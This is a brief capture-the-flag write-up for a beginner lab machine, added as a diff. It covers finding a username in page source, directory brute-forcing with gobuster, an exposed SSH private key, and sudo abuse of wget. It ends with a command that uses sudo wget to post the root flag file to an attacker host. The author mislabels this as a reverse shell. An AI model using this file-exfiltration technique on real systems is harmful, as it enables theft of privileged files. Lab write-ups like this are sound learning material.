@@ -1,0 +1,10 @@
+Well this is the great room for the begineers.I first got nothing while searching for the port 80, I mean from the http home page. Hence I lookup the view-source and I found the Jessie who might be the user.
+
+Next I go after the directory search and I found the /sitemap from the help of gobuster.
+
+Then again i search for the dir after $IP/sitemap and again there i found id_rsa which might be the door for the ssh. And that's it i got into the Jessie shell and found the user flag
+
+And here's come the interesting part while i go for the root.txt file. I check for the possibility for prevelege escallation for sudo and i found for /usr/bin/wget. Here I learn new stuff for reverse shell for the wget. I googled it and found the perfect command for the reverse shell which you can see from the image. The command I used.
+
+sudo /usr/bin/wget --post-file=/root/root_flag.txt IP:8080
+
